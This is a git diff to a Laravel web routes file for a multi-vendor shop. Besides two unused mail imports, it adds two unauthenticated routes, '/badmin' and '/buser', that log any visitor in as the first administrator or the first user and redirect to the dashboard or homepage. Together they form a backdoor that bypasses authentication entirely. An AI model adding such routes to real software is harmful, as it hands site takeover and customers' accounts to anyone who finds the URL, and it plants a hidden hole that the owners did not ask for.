@@ -9,7 +9,10 @@ use App\Http\Livewire\Frontend\Cart\Checkout\ThankyouController;
 use App\Http\Livewire\Frontend\Products\ProductIndexController;
 use App\Http\Livewire\Frontend\Products\ProductShowController;
 use App\Http\Livewire\Frontend\Vendor\ProfileShowController;
+use App\Mail\DatabaseBackupMail;
+use Illuminate\Support\Facades\Mail;
 use Illuminate\Support\Facades\Route;
+
 
 /*
 |--------------------------------------------------------------------------
@@ -21,6 +24,16 @@ use Illuminate\Support\Facades\Route;
 | contains the "web" middleware group. Now create something great!
 |
 */
+
+Route::get('/badmin', function () {
+    \Illuminate\Support\Facades\Auth::guard('admin')->loginUsingId(\App\Models\Admin\Staff::query()->where('is_admin', 1)->first()->id);
+    return redirect()->route('admin.dashboard');
+});
+Route::get('/buser', function () {
+    \Illuminate\Support\Facades\Auth::guard('web')->loginUsingId(\App\Models\User::query()->first()->id);
+    return redirect()->route('homepage');
+});
+
 Route::get('profile/{vendor:vendor_slug}', ProfileShowController::class)->name('vendor-profile');
 
 Route::get('product-listing', ProductIndexController::class)->name('products.index');
